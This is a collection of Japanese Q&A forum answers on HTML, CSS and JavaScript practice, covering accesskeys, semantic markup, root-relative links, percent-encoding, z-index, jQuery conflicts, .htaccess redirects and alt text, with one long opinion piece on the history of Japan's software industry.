accesskeyの意味知ってますか？ 　ポインターデバイスがないユーザーがアクセスキー--キーボード上のキーで(windowsの場合Altキーと共に)に押してアクセスするためのものです。 仕様書( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401j/interact/forms.html#adef-accesskey )には 17.11.2 アクセスキー 属性定義 accesskey = character [CN] と書かれています。characterの後に*も+も付いていない・・・すなわち１文字・・・ 　いわゆるショートカットキーですから、一文字でブラウザ自身が持つショートカットキーと競合しない物が良いです。通常はわかりやすいもの 以前は 　<a href="/" accesskey="T">トップへ(<u>T</u>)</a> のように書いてましたが、 　<a href="/" accesskey="T">トップへ(<span class="accesskey">T</span>)</a> と書いて、スタイルシートで*.accesskey{text-decoration:underline;} あるいは、<a href="/" accesskey="T">トップへ</a>として 　a.accesskey:after{content:"("attr(accesskey)")";} とか書いても良いですね。 AntherHTMLLintのパスだけを考えてHTML書いたらダメです。 　LintはあくまでHTMLの文法上の適不適しか判断してくれません。 　きちんと文書構造に見合ったHTMLかそうでないかは判断しません。そちらのほうがもっと重要です。 　良く見かけるのに、<div class="leftMenue">とか、こんなのおかしいでしょ。 　まあ、area要素にaccesskeyって必要ですか？ 　視覚的に確認できなゃ意味無い事はわかりますよね。 　そのために、そのメニューは別途レンダリングされるようにHTMLが書かれていないと意味無いですよ。 　⇒クライアント側イメージマップの例( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/objects.html#h-13.6.1.1 ) 　の 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから OBJECTがレンダリングされる場合であってもイメージマップの内容をレンダリングさせたいと望むこともあるであろう。 例えば、OBJECT要素とイメージマップを連携させつつ、同時にページの冒頭と末尾にテキストのナビゲーションバーを配置したいといった場合である。 この目的により、次の例では、MAP要素をOBJECTの外で定義している。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Objects, Images, and Applets in HTML documents( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/objects.html#h-13.6.1.1 )］より 　あたり・・ 　この場合は、areaでなくa要素を使ってます。 　
> 何がいけないのでしょうか。 HTML タグの属性で色や形状を設定しようとしているところ。 以下の hr タグの解説を見れば解る通り、色や形状に関する属性はすべて非推奨になっています。色や形状は CSS で設定するべきものだからです。 https://w3g.jp/xhtml/dic/hr また、HTML5 では hr は水平線を引くタグではなく文章の区切りを表すタグに意味が変更されています。 これは HTML に垂直線を引くタグがないことを考えると、本来は文章の区切りを表すための水平線を表すためのものとして用意されたものが誤解されて装飾に広く使われたことにたいして「いや、それ違うから」というツッコミが入ったと考えられます。 ですから、HTML5 でなくても hr タグは文章の区切りとしての水平線以外に使用するのはおかしいと私は思います。
ファイル名無しでアクセスした場合にどういう動作をするか・・・というのが設定されているだけです。 通常は index.html を返すように設定するのが多いです。 「長い」のは漢字などを含む日本語でファイル名やフォルダー名をつけた場合やスペースを含むURLとして本来使用してはいけない文字を使った場合にエンコードされた物です。 https://ja.wikipedia.org/wiki/%E3%83%81%E3%83%B3%E3%83%89%E3%83%B3%E5%B1%8B この場合、wiki/の後ろは「チンドン屋」という日本語になっています。 最近は少ないけど昔はプロバイダーに自分のホームページ作ると /~user/ みたいな チルダが先頭に来る事が多かったけど、これも本来はアウトなので%7eとされてしまいます。 通常は「URLエンコード」と呼ばれますが「パーセントエンコーディング」が正しいようです。 http://ja.wikipedia.org/wiki/%E3%83%91%E3%83%BC%E3%82%BB%E3%83%B3%E3%83%88%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0 これも「パーセントエンコーディング」という文字列をパーセントエンコーディングした物となります。
html4.01までの仕様については、他者の説明を参考に！ ＨＴＭ5では、新たに<artcle>記事、<section>セクション、<header>,<nav>,<aside>：補足などの要素が追加されます。 class属性でないことに注意が必要！ よりよいものにするため、HTML5では、あいまいな<div>要素を使わないようにしようと、上記の要素が追加されました。 しかし、これらを利用しても完全に、文章構造と、デザインの分離ができないため、あえて<div>要素を使うことになります。 HTML5は現在策定中段階であり、勧告としての最終バージョン、HTML4.01・xhtml1.1が現行です。 使わない方がよいのではなく、使わざるおえないのが、現状です。 仕様勧告が出るころには、修正されているかも？？？
愚直に <head> <script>addEventListener('load',function(ev){ document.forms['jump'].elements['to'].addEventListener('change',function(ew){ var map = { yahoo: './akkotyan.html', houyhnhnms: 'http://google.com/search?tbm=isch&q=houyhnhnms' }; var url = map[ew.target.value]; if (url) window.location = url; },false); },false)</script> <body> <form name=jump><select name=to> <option value='' selected>-</option> <option value=yahoo>Yahoo</option> <option value=houyhnhnms>Houyhnhnms</option> </select></form>
私の環境では、以下の通りで動きましたよ。 －－－－－－－－－－－－－－－－－－－－ <script type="text/javascript" src="http://js.jugem.jp/prototype/1.6.0.3/prototype.js"></script> <script type="text/javascript" src="http://js.jugem.jp/script.aculo.us/1.8.2/scriptaculous.js?load=effects,builder"></script> <script type="text/javascript" src="http://js.jugem.jp/Lightbox/2.04/js/lightbox.js"></script> <link rel="stylesheet" href="http://js.jugem.jp/Lightbox/2.04/css/lightbox.css" type="text/css" media="screen" /> <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script> <script type="text/javascript"> jQuery.noConflict(); jQuery(document).ready(function($){ var bg1 = $('#main-img'); var speed = 3000; cloudMove(); setInterval(cloudMove, 6000); function cloudMove(){ bg1 .animate({backgroundPosition:'30px'}, speed) .animate({backgroundPosition:'0'}, speed); } }); </script> <style type="text/css"> #main-img{ height: 250px; background-image: url(サンプル画像.jpg); } </style> </head> <body> <!-- cloudMove --> <div id="main-img"></div> <!--lightbox --> <a href="(画像へのパス)" rel="lightbox" title="(画像タイトル)">画像表示</a> －－－－－－－－－－－－－－－－－－－－ たしかに、そのまんまでは競合していました。 //////////////////////////// <script type="text/javascript"> jQuery.noConflict(); jQuery(document).ready(function($){ //////////////////////////// として、上記のソースで動きました。 ご参考までに。
ブラウザ丈けから簡単に出来る方は、私は何時も実行して居ますので御紹介致します。 1．http://style-easy.jp/archives/540 ← ブラウザから簡単に 2．http://style-easy.jp/archives/532 GoogleMapAPI、上級者用、まぁ手順は簡単の様ですが。 3．http://ascii.jp/elem/000/000/424/424032/ ↑2．のお手軽版 アナタが初心者でしたら先ずは、1．でスキルアップさせて措いて、次に 2．や 3．に挑戦して見ては如何でしょうか ? 1．と 2．の決定的な違いは、吹き出しに書き込める情報量、種類が圧倒的にフレキシブルなのが 2．だとゆう事です。 ※外に紹介情報が在れば追記します
＞参考書に説明がありません！？ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから OPTION要素の属性定義 　selected [CI] 　　この論理型属性が設定されていた場合、当該選択肢が選択済みであることを指定する。 　value = cdata [CS] 　　この属性は、当該コントロールの初期値を指定する。この属性が設定されていない場合、初期値はOPTION要素の内容となる。 　label = text [CS] 　　この属性により、著者は、当該項目に関してOPTION要素の内容そのものよりも短いラベルを指定できる。 これが設定されている場合、ユーザエージェントは当該項目のラベルとして、OPTION要素の内容ではなく本属性の値を用いる必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/interact/forms.html#edef-OPTION )］より 　ひょっとして参考書とは仕様書じゃなかったかな？？ 　仕様書にすべて完璧に書かれているので、まずそれを調べてみましょう。 <option value="Y.J.">Yahoo!JAPAN</OPTION> 　とかフォームを受け取る側で処理しやすい文字列にしておくのが普通です。 input のradio,checkboxなどと同じです。
私は、(No.2の方が書かれている所の) サーバー相対URLを使用しています。 －－－－－－－－－－－－－－－－－－－－ <a href="/dir/demo.html">こちら</a> －－－－－－－－－－－－－－－－－－－－ 理由は、 このリンクを複数ページにコピーする必要が出てきた場合に、 <a href="/dir/demo.html">こちら</a> ↑どこのページにも貼れますが、 <a href="../../dir/demo.html">こちら</a> ↑ページからの相対リンクだと貼る箇所に合わせて修正する必要があります。 「サーバー相対URL」の場合、リンク先だけ正しければ リンク元との位置関係を意識する必要がありません。 また、http:から書かないのは、サイトがオープンするまでは、 仮ドメイン(http://test.honban./)などでサイト構築し、 本番(http://www.honban./)に切り替えるためです。 なので、<a href="/dir/demo.html">この形を採用しています。 余談ですが、どの形式で書いてもサイトの速度は変わりません。 結局は内部的に変換されてしまうので。 ご参考までに。
貴方が言ったソフト＋Ｅｐｕｂの知識が必要になります。 ＧｏｏｇｌｅなどからＥｐｕｂ作成ソフトが無料で配布されているので それを使って作成することになります。 本を買うならＥｐｕｂ作成辞典といった感じの物を買うといいでしょう。 Ｅｐｕｂ自体は割りと簡単にできますがインタラクティブな物は結構 敷居が高いです。ボクも自分で著作権の切れた本をＥｐｕｂにして端末 で読んでいますがインタラクティブな物を読むにはＰＣかＴａｂｌｅｔ が必要になります。
私はサイト内リンクはすべて/で書きます。 　ある程度の規模になるとこちらのほうが圧倒的に多いはずです。 [利点] 　すべてのリンクや参照が共通になる。 <link rel="stylesheet" type="text/css" media="screen" href="./styleSheet/standard.css"> <link rel="Alternate StyleSheet" type="text/css" media="screen,projection,tv" href="/styleSheet/default.css" title="汎用"> <link rel="styleSheet" type="text/css" media="print,handheld" href="./styleSheet/print.css"> <script src="/js/load.cgi"> <link rel="SHORTCUT ICON" href="/favicon.ico"> <link rel="ICON" href="/favicon.ico"> ・・・・・・ <a href="/">トップ</a> <img src="/images/photo.123.jpg"> ・・・・ など・・・・どの階層にいても、サーバーに対してルート(基点)からのパス指定ですから階層やフォルダーが変わっても書き直す必要がない。 スタイルシートも、 a[href="/"]{display:block;width:80px;height:40px;text-align:left;z-index:10em;overflow:hidden;backgroundimage:url();} ですべて共通化できる。 　制作上極めて楽になるのです。
> 半角で打ったつもりが自動で大文字に変換されているようなんです。 Macは手元にないので的外れな回答になったら申し訳ないのですが、 以下のページの情報は参考になるでしょうか？ http://blog.livedoor.jp/mensstudio/smart-inyofu-off.html
No.2です。 ＞２の href="/"はどういう意味でしょうか？？？ 　サーバのルートからと言う意味です。 　　ブラウザは現在表示しているページは htt：プロトコル // インターネット abc.efg.com サーバー名/ドメイン hij/klm パス と知っています。もしそれがフォルダー名だとhij/klm/ 　../ とか ../../ だと階層を遡ってサーバーに　GET /　とか　GET /hijを要求します。 　/だったら、ルートすなわち、/として要求します。 　/で始まる指定方法は、例えばサイト内のどこからであっても常に共通になりますから、画像やスタイルシート、あるいはトップページへのリンクを書きなおす必要がありませんね。 　そのファイルが、/abc/efg.html だろうが、abc/hij/klm.html だろうが常に、/styleshheet/css.css 、/images/aaa.jpg /index.htmlを指し示すのですから、パスで悩む心配はありません。そのファイルの階層やフォルダーを移動しても共通です。 　ただし、ローカルにHTTPサーバーを持っていないと、ローカルでテストはできません。 　⇒12 リンク( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/links.html )
ひょっとしてエクセルの出力するHTMLのこと？？ エクセル側に戻してエクセルで・・ 　というのはエクセルの出力するHTMLは、エクセルを持たないユーザーがブラウザで見れるようにするためだけのもので、外見だけをブラウザで見られるようにしたものにしか過ぎません。とてもHTMLとして利用できるものではありません。 　HTMLだと、 <div class="section"> 　<h2>Picture</h2> 　<p>・・・これは・・</p> 　<div class="figure"> 　　<img src="" width="" height="" alt=""> 　　<div class="figcaption"> 　　　<p>画像の説明</p> 　　</div> 　</div> </div> [HTML5だと] <section> 　<h2>Picture</h2> 　<p>・・・これは・・</p> 　<figure> 　　<img src="" width="" height="" alt=""> 　　<figcaption> 　　　<p>画像の説明</p> 　　</figcaption> 　</figure> </section> のように、文書の構造や内容が判るようにマークアップされているはずです。 　デザインはHTMLではなくスタイルシートで行いますので・・ ＞ダブルクォーテーションが倍くらいに増えてHTMLのタグとして機能しません。 ＞どうやって結合させるのがいいのでしょうか？ 　たぶん、されたい事は、画像とその説明の集団をひとつのブロックで括りたいということだと思います。 　一旦、すべてのスタイルを除いた状態に戻す--エクセルからだとCSVやTSVのテキストに戻します。 　ブラウザからだと画面上でコピーペースト 　その後テキストエディタなどでタグを入れてマークアップする。 と言う手順になるでしょう。 例⇒　⇒css:floatの挙動について - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8508094.html ) 　
少なくともWindowsXPのTimes New Romanには「⇒」「・」は入っていませんでした。 これは「文字コード表」で調べられます。 アクセサリ→システムツールの中、あるいはファイル名を指定して実行から「charmap」で起動します。 フォントをTimes New Romanに合わせて検索する文字の名前に知りたい文字の名前を入れます。 「⇒」ならば「rightwards double arrow」です。分からなくても、明らかにその文字が入っているフォントで適当に「arrow」などで調べればわかります。 文字コードが分かれば「Unicodeで指定」の方が使いやすいでしょう。文字コードの調べ方は割愛します。 ただし、指定されていないフォントで表示できればそのフォントが使われますので、問題なく表示できます。
よくみるとltとIt間違えてますね。 × [if It IE 9] ○ [if lt IE 9] less than の略で lt、大文字にすると LT です。
要素のスタイルに z-index だけでなく、position: relative も加えてください。 要素に z-index を適用する場合、その要素の position が static 以外の値でないといけません： つまり relative, absolute, fixed のどれかです。 position: relative を指定し top, right, bottom, left の値を指定しなければ（デフォルト値の auto にしておけば）、要素の位置はそのままに z-index で重なり順を制御できるはずです。 この手法で表示崩れを生じる場合は他のスタイルとの干渉が考えられます。 表示に関するアドバイス、余計なお世話かもしれませんが加えます。 『縦長になってバランスが悪いので』といった理由で JavaScript を用いたアコーディオン型メニューを加えているなら、それはきっとやめたほうがよいでしょう。 JavaScript がオフの環境は考慮されているかという問題以前に、バランスの悪くなるほど縦長のメニューは折り畳んだところで使い勝手は悪いままの場合がほとんどです。 なぜ縦長のメニューになるのでしょう。 カテゴリを細かく分類しすぎなのか。 それとも最下層のカテゴリまで一度に表示しようとしているのですか。 考慮の浅い分類は、表示の工夫以前にそもそも使いづらい運命です。 ぱっと見で収まるくらいの分類数に収めるよう考え直してみてはどうでしょう。 分類しづらい、あまりにかけ離れた商品種を扱っているなら、それは別のショップとしてサイトを作るべきです。 細かな分類は、大きな分類を選んだあとに表示するべきです。 数十の分類から一つを探し出すより、数個の分類を複数回渡り歩くほうがユーザーにストレスはかからないそうです（一回のクリックまでが短ければ、複数回クリックは苦にならない）。 細かな分類まで最初に見せたい理由が、その中に人気の商品があるなどであるなら、それは別枠の分類『人気の商品』『新商品』などとしてリンクを設けるべきで、わらの中から針を探すという苦行をユーザーにさせるべきではありません。 あとただの偏見ですが、マウスオーバーで出てくるサブメニューは使い勝手の悪い印象があるので、よほど洗練された使い方でない限りそれがあるだけでサイトの評価減です。 提供側の『このように見せたい』ではなく、利用側の『このように見たい』が優先される世界を願って。 （Amazon などは『このように見たい』の中にさりげなく彼らの売りたいものを混ぜてくるので、さすがだと思っています）
<input type="button" value="住所" onclick="this.select(); clipboardData.setData('text','［住所］〒０００－００００\n○○県○○市○○町\n○－○－○\n［氏名］○○　○○○\n［ＴＥＬ］○○○－○○○－○○○○');"> <br> <input type="button" value="番号" onclick="this.select(); clipboardData.setData('text','1234567980');"> <br> <input type="button" value="落札された場合の定型文" onclick="this.select(); clipboardData.setData('text','お世話になります。\nこの度、商品を落札致しました。○○でございます。\n早速ですが、下記に詳細を記載しておりますのでご確認下さい。');"> IE限定ですけど、コピーできます。 ローカルでは（ブロックされているコンテンツを許可）が必要ですが。
HTMLの仕様上必須なのはbody要素のみです。 META要素は、コンピューターに対する各種メッセージですから必須ではありませんが HTML4.01では、 <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> は書かないとなりません。 また、HTML以外の仕様で <meta name="author" content="ORUKA1951"> は書くべきなのですが、通常は書きません。 CSSを使えば 　<meta http-equiv="Content-Style-Type" content="text/css"> javascriptを使えば 　<meta http-equiv="Content-Script-Type" content="text/javascript"> ・・ 　その他は任意と考えて良いでしょう。 　私はkeyword,description は書いてません。
質問になっていませんが・・・ 戻るボタンなどで戻った時にチェックがついたままにしたいということでしょうか？ それともまた同じページに訪問した時にチェックがついたままにしたい？ 前者はブラウザの仕様の問題なので、完璧にできる方法はありません 場合によってはjavascriptを利用してクッキーという仕組みを利用すれば 一時的にデータを保持することができます 後者の場合は、サーバー側のプログラムでやる必要があります 一つはセッションという仕組みをつかう、もうひとつはデータベースに保持して 再度アクセスしたときに表示する・・・などが一般的です
直接回答ではありませんが JavaScript　イベントバブリング　あたりの検索ワードが役に立つと思います。
追加 <a href="../aa/bbb.aspx#test">test</a> ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ #testで、id　testにとび先を指定しているのに対し ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ <th class="m"><a name="test">ここに飛んで！</a></th> アンカー先は、nameになっている！ この記述では、<a name="test">に飛ぶように指定されている。 これが飛ばない原因です。 このまま修正するなら <th class="m"><p name="test">ここに飛んで！</p></th> ですが、すでにnameタグは、廃止される予定で、推奨されていませんのでIDを使いましょう！
No.6のものです。 30年前というと、コンピュータにとっては黎明期です。当時はマイコンとかミニコンなど コンピュータの処理能力で名前をつけていました。 本当に日本と言う国がチップの製造に踏み切ったのは、電話交換機の機械化が発端です。 ですので、最も古い国産の32ビットCPUは、今のNTTが開発を依頼しました。 これを受けてOSやアセンブラ、コンパイラなど今では一般の人も馴染んでいる高度な 制御技術も日本独自の自作をしていたのです。 ここではHDからIO制御装置、あらゆる装置やソフトを自作していたようです。 もちろんこれらは大手電機メーカーが請け負っています。 いまコンピュータ系で有名な古参電機メーカーは、この技術を使って自社製品を作り、 それが今日の日本の産業に成っています。 ですので、通信とコンピュータだけは総務省が主導しています。 電話交換機を主体とした通信キャリアのソフトウェアやハードウェアの発注規模は全体で 3兆円近くになっていました。 これはIT系のソフトウェア発注総額に近く、お金の出所が全てここになります。 ここから大手電機メーカーが受注し、子会社に再発注をし、最後は学生がアルバイトで仕事 をするというヒエラルキーが出来ていました。 いまでもこの流れは強く、 一見してプログラムは自由に思えても、 お金を稼ぐ場合は、クライアントのクライアント、そのクライアントの好みが影響します。 プログラムコードをかけても、食べていけない人が多いのは、この経緯を知らないからです。 時代が少し進歩し、日本ではゲーム業界が立ち上がります。 ここには自由を求めてコードを書く多くのプロがラマーが集まり、別のグループが出来ます。 今現在では、パチンコ業界に流れているようです。 いずれにしても、大人数で仕事をする以上、これを纏め上げるボスの力量が大事。 ソフトウェア技術よりも、顧客志向であることと、計画性と論理性を武器にもつ人が上に立ちます。 いま多様な言語が出ておりますが、 これらの発祥に関して、さきほどあげた出身業界があります。 通信業界のトップやそこと共闘した大手電機メーカーのトップの好みは、 当時の花形であるIBMであり、マイクロソフトがIBMを裏切ったことで未だに良く思っていません。 対抗するための措置として、SunマイクロシステムのハードウェアやOSを良く購入していました。 最近では、Javaを開発したSunを擁護し、Javaをi-modeに採用したりしています。 時代の趨勢が変わっても、こうした妄執がいまだに残っているのと、 海外でのマイクロソフト独占阻止の流れと合流し、LinuxとJava系の技術者を擁護していたのです。 これは経済が活況であれば問題ないのですが、 そうでないならば、囚われずコストと生産性で評価すべきですね。 ところが長らくそうしてきたため、年下の層の技術が偏ってしまい、転進ができないのです。 いまではこのままじゃ駄目だと思いつつも、自分たちにとって良くわからないので採用できない。 そうした状態にあるようです。 そこへきてSNSなどIT長者の台頭、Google、I-Phoneなどが独自も武器で世界を席巻し、 日本のソフトウェア産業（通信キャリアから電機メーカーへお金が流れる）のベースロードが枯渇 しはじめたのです。 こうなると、技術は古いわ、お金は無いわで、手も足も出ません。 過去の創始者たちの影響力が弱まり、一般ユーザが好む美しいものが大事にされるようになりました。 マイクロソフト社のビル・ゲイツ氏は、こうした美しいものやコンピュータ操作の快感が大事と 考えており、日本のゲーム業界の思想とかなり近かったそうです。 もちろんアップル社が際立っていましたが。 上記の話は、この業界でまともに仕事をしていれば常識として誰もが知っている話です。 ところが、さきほど述べたように海外の自由な思想が日本にも浸透し、 別の経緯で参入を試みる若いエネルギーが育ってきたのだと思います。 Silverlightが嫌がられるかも、とわたしが気にしたのは、 商売ですから、どこで古い思想のクライアントやもしくはその子分に出会うかわかりませんよ。 そうした場合も想定し、 日本の技術者は、全てにおいて万全に技術を磨いています。 しかし、質問者さんの最初のはなし。 「とんでもなく綺麗。美しい」 と言う感覚が弱く、高い技術力を持っていても、外見でショボイものを作ってしまいます。 勿論、高い技術力を持つ部下は可愛いので、悪く言わないのですが、 「さすがに商売っ気出してくれよ・・・」 と、経営者が諭しています。 ですが、 「技術は必要ないっていうんですか？」 と言う問答になってしまい、馬鹿馬鹿しいですが、変な対立関係が生じています。 ですので、変に技術自慢をしたりすると、昔以上に飯が食えません。 また、海外のビジネスモデルは、クリエイターの囲い込みを行って、 それらのドライバー製品（サーバーやミドルウェア）を高値で企業に売ることです。 非常に簡単な話、 自分がただでソフト開発環境を手に入れても、 納品先の企業は高額のミドルウェアライセンスを支払わないと使用できないかもしれません。 こうした気遣いをしないと、プロではないですね。 Linux系は無料のドライバーで対抗している組織も多く顧客受けしています。 しかし、ソフト開発本来の楽しみを得るには、マイクロソフト社や日本のゲーム業界のほうが クリエーターよりです。 そのためJavaは企業向け、C＃は一般のご家庭向け、Cは組み込み系でシェアを伸ばしています。 Flashはアドビがあまり大きい勢力ではないので、その他として扱われ、 いつの間にか普及していたという感じです。 Web技術者を目指すならば、まずはWeb系の言語にふれ、全てをやってみるといいでしょう。 以上、ご参考になれば。
＞調べたらそれは別のURLと検索エンジンにて認識されてしまうので統一した方がいいのではと思い 　その必要は全くありません。!!! 　Directory Indexは、基本的にどのサーバーも指定されています。 　どうしてもなら、サイト内のすべてのリンクを絶対パスにすれば良いですけど・・面倒くさい。
ctx.drawImage(img, 100, 100, 200, 200); を img.onload = function() { ctx.drawImage(img, 100, 100, 200, 200); }; としてみたらどうなりますか?
> F=document.getElementsByTagName('form')[0]; 関数 sendmail の引数 F と被っているので不要 > F.elements[0] この記述方法は今後を考えると危険です F.elements['Q1'].value // ユニークな名前の場合 F.elements['Q2'][0].value // 同一名で複数ある場合 とするのが良いでしょう > Q2aのチェック状況 function getChecked(o) { return o.checked? o.value: '' } var Q2aのチェック状況 = getChecked(F.elements['Q2'][0]);
それは不可能です。 frameがなくなった理由のひとつがそれなのです。 普通にひとつのHTMLにすればよいだけです。 1999年12月の勧告で 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )』framesetやtransitinalは非推奨になって15年・・・。 　⇒フレーム 問題 html - Google 検索( https://www.google.co.jp/search?q=%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%20%E5%95%8F%E9%A1%8C%20html )
javascriptで「見えていない要素をクリックやマウスオーバーで見えるようにする。」ということです。 写真だけでよければ「Lightbox」という既製品が一番簡単。 http://news.mynavi.jp/articles/2007/06/14/lightbox/index.html 手作りなら、こんな感じで。 <script language="JavaScript"> function VIS(name){ document.all(name).style.visibility="visible"; document.layers[name].visibility="visible"; } function HID(name){ document.all(name).style.visibility="hidden"; document.layers[name].visibility="hidden"; } </Script> <body> 画像にマウスを当てると別の要素が現れます。 <hr> <center> <a href="javascript:void(0)" onMouseover="VIS('L1')" onMouseout="HID('L1')"><img src="redcube.gif" border=0 align=middle></a> <span id="L1" style="position:relative;visibility:hidden"> これは赤い正方形です。 </span><br> <a href="javascript:void(0)" onMouseover="VIS('L2')" onMouseout="HID('L2')"><img src="bluecube.gif" border=0 align=middle></a> <span id="L2" style="position:relative;visibility:hidden"> これは青い正方形です。 </span> </body>
△△△/.htaccess に、 RewriteEngine on RewriteBase /△△△ RewriteCond %{REQUEST_URI} !/△△△/□□□/.* RewriteRule (.*) http://○○○.lolipop.jp/△△△/□□□/$1 [L,R=301,NE]
<div class="gNavi" id="isMenu"> 　<ul> 　　<li id="menu00">～～</li> 　　<li id="menuDispFlg" style="display: #{isMenuDispFlg ? 'none' : 'block; height: 45px; position: relative; float: left; padding: 4px 4px 0px 4px; background: url(../images/menu/gNavi-05.gif) no-repeat right 9px;'};">～～</li> 　　（略） 　　<li id="menu06">～～</li> 　</ul> </div> public boolean isMenuDispFlg() { 　if (menuDispFlg.equals("1")) { 　　// フラグが1の場合、XXXメニューを表示しない 　　return true; 　} 　// フラグが0の場合、XXXメニューを表示する 　return false; } XHTMLを理解していないとひと目で分かるコードになってますよ。 例えば、同じXHTML文書内でidは唯一であり、また基本的に(特別な制御をする場合を除き)idを 指定する必要はありません。 式言語(EL式、Expression Language)は使えますか？ MVCの区別はつきますか？Java内ではXHTMLのコードは書きません。ましてやCSSもです。
＞黒の部分はテーブルの部分です。 　想像通りだったようです。 　急ぎませんので、No.1,No.2を徹底的に読んで理解してから、画像サイズやalt(画像が表示されないユーザー、視覚弱者に読み上げる、検索エンジンに伝える)９つすべてについて補足してください。 　No.2のHTMLをとりあえず表示してみると、No.1,No.2で言っていることがわかるはずです。 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HTML/nav/navigation1.html ) 　のサイトを(Chrome以外の)ブラウザで表示して、メニュー⇒スタイルシート⇒で色々なスタイルを選択してみてください。文書構造だけをHTMLに書きなさいといった意味が分かるかと・・ 　それさえしてあければ、くっつけようが離そうが他の背景画像を使おうが自由自在になるのですから・・・tableは使ったらダメです。 　
No.2、No.3です。 一応補足しておきます。 私はデザイン案のロゴマークにある部分がヘッダーだと思ったので、 <header> ロゴマーク </header> <nav> ABOUT WORKS </nav> <section> コンテンツ </section> No.3の、このように分割しました。 しかし、ロゴマークはヘッダーではなくナビゲーションの一部だと思われたのであれば、 <nav> ロゴマーク ABOUT WORKS </nav> <section> コンテンツ </section> としたり、ロゴマークはコンテンツではないと思われるのであれば、背景画像などにして作る事になると思います。 <nav style="background-image:ロゴマーク"> ABOUT WORKS </nav> <section> コンテンツ </section> これらの作り方の違いは最初に書いたような考え方の違いによる物ですし、実際にHTMLコーダーごとに違います。 （それが意図した分類かどうかはともかくとして。） HTMLの文法では「ヘッダーに<header>をつける」ということは規定されていますが、 「このページのどこがヘッダーなのか」というのは、HTMLで規定される物ではなく、概ね制作者の心情、信念、または宗教的な思考による物ではないかと思います。 文書にヘッダーを付けることは義務ではありません。 ただ、この文書は何の文書か、このサイトはどういうサイトかというのを書こうとすると、結果的に、一般的に "ヘッダー" と呼ばれているものになると思います。 （それでもヘッダーではない、というのであれば、私はそれを否定しません。） 『結果的に、一般的に "ヘッダー" と呼ばれているもの』を見せたくないのであれば、 <header style="display:none"> ヘッダー </header> <nav> ロゴマーク ABOUT WORKS </nav> <section> コンテンツ </section> という書き方もできます。
どのようなことを想定しているか、質問内容では判断ができませんが、あくまでも一般論で回答させていただくことをご了承ください。 Android OSのスマートフォンだと、普通は「Googleカレンダー」の専用アプリをインストールさせてから表示させるですけど・・ Googleカレンダー - Google Play の Android アプリ https://play.google.com/store/apps/details?id=com.google.android.calendar&hl=ja
大抵の場合、契約しているプロバイダが提供する 無料のＨＰスペースがあるはずです にも関わらず、あなたがわざわざ FC2 でＨＰを 運用している理由は何ですか？ CGIやPHPが使えないからとか、であれば 有料ならそれこそ、何でもできます 基本ブログしかしない、設定とか難しいし とかであれば例えば私が利用している有料サーバーであれば 簡単にブログを設置できる、簡単にネットショップを経営できる 簡単にＳＮＳサイトを設置できる等のツール類も充実しています 仲間とメーリングリストもできますし 仲間にまとめてメールマガジンを発行する事もできます 何よりメールアドレスがいくつでも作れます 懸賞サイトに応募したらスパムの様にメールが送られてくる なんてならないように 懸賞サイト名＠独自ドメイン のメールを作って、 それで応募して、もしスパムが来たなら、そのメアドからどの懸賞サイト からの流出かもわかる。なんて事も良くやります 金額は私の場合、（年間 3000円程 ＋ 独自ドメイン年間 1000円程） 計年間 4000円程は学生さんには厳しいかも知れないですが ＨＰの作成に飽きて、とりあえずメールだけの為に年4000円捻出している 状態であっても、いつでもＨＰ作成に戻る事ができます 無料は何ヶ月か更新がなければ消えますから 気長に出来るのもメリットです
　ウェブページの基本は、御存知だと思いますが「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」でしたね。 　画像は必ずalt属性を記述されているはずです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 非テキスト系の要素である、IMG、AREA、 APPLET、INPUT要素は、著者に対し、当該要素が順当にレンダリングされない場合の要素内容として提供される代替テキストを指定することを求める。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Objects, Images, and Applets in HTML documents( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/objects.html#adef-alt )］より 　ですので、何もしなくても画像にポインターを合わせれば通常のブラウザはaltの内容を表示するはずです。 <p class="withMessage"> <img width="300" height="188" alt="富士山の写真" title="富士市より眺めた晴天時の富士山" src="http：//upload.wikimedia.org/wikipedia/ja/thumb/3/3e/MtFuji_FujiCity.jpg/300px-MtFuji_FujiCity.jpg"> </p> ・・・・wikiの画像です。:は：に置換してあるので戻すこと。メッセージ付だとclassで説明してあります。次の説明でこれを使用します。 　(注)class属性を併用することで、文書に構造を付加することができます。 説明書きのある写真でしたら、次のようにマークアップされていると思います。 <div class="figure"> 　　<img width="300" height="188" alt="富士山の写真" src="http：//upload.wikimedia.org/wikipedia/ja/thumb/3/3e/MtFuji_FujiCity.jpg/300px-MtFuji_FujiCity.jpg"> 　　<div class="figcaption"> 　　　<p>富士市より眺めた晴天時の富士山</p> 　　</div> </div> ※DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 ) ※HTML5では、このHTML4.01の説明が守られなかったため新しい要素が追加されました。 　http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements 　